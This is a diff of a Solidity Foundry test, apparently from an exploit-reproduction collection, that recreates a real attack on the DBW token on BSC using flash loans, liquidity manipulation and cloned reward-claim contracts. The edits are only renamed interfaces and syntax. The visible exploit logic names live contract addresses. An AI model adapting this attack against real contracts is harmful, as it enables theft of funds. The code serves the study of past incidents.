@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/BeosinAlert/status/1639655134232969216
@@ -28,13 +27,13 @@ contract ContractTest is Test {
 
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x69D415FBdcD962D96257056f7fE382e432A3b540);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
     address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
     address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
     address dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
-    Uni_Pair_V2 flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
+    IUniswapV2Pair flashSwapPair = IUniswapV2Pair(0x618f9Eb0E1a698409621f4F487B563529f003643);
     uint256 dodo1FlashLoanAmount;
     uint256 dodo2FlashLoanAmount;
     uint256 dodo3FlashLoanAmount;
@@ -42,19 +41,17 @@ contract ContractTest is Test {
     uint256 PairFlashLoanAmount;
     claimRewardImpl RewardImpl;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 26_745_691);
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(DBW), "DBW");
-        cheats.label(address(Pair), "Pair");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(dodo1), "dodo1");
-        cheats.label(address(dodo2), "dodo2");
-        cheats.label(address(dodo3), "dodo3");
-        cheats.label(address(dodo4), "dodo4");
-        cheats.label(address(flashSwapPair), "flashSwapPair");
+        vm.createSelectFork("bsc", 26_745_691);
+        vm.label(address(USDT), "USDT");
+        vm.label(address(DBW), "DBW");
+        vm.label(address(Pair), "Pair");
+        vm.label(address(Router), "Router");
+        vm.label(address(dodo1), "dodo1");
+        vm.label(address(dodo2), "dodo2");
+        vm.label(address(dodo3), "dodo3");
+        vm.label(address(dodo4), "dodo4");
+        vm.label(address(flashSwapPair), "flashSwapPair");
     }
 
     function testExploit() external {
@@ -94,7 +91,7 @@ contract ContractTest is Test {
         USDTToDBW_AddLiquidity();
         miniProxyCloneFactory(address(RewardImpl));
         RemoveLiquidity_DBWToUSDT();
-        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);
+        USDT.transfer(address(flashSwapPair), (PairFlashLoanAmount * 10_000) / 9999 + 1000);
     }
 
     function USDTToDBW_AddLiquidity() internal {
@@ -126,7 +123,7 @@ contract ContractTest is Test {
             deploy(creationBytecode, _salt);
             (uint256 USDTReserve, uint256 DBWReserve,) = Pair.getReserves();
             uint256 DBWInPairAmount = DBW.balanceOf(address(Pair));
-            uint256 USDTTransferAmount = DBWInPairAmount * USDTReserve / DBWReserve - USDTReserve;
+            uint256 USDTTransferAmount = (DBWInPairAmount * USDTReserve) / DBWReserve - USDTReserve;
             USDT.transfer(address(Pair), USDTTransferAmount);
             Pair.mint(address(this));
         }
@@ -167,7 +164,7 @@ contract claimRewardImpl is Test {
 
     function exploit() public {
         IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
-        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
+        IUniswapV2Pair Pair = IUniswapV2Pair(0x69D415FBdcD962D96257056f7fE382e432A3b540);
         Pair.approve(address(DBW), type(uint256).max);
         DBW.getStaticIncome();
         vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit
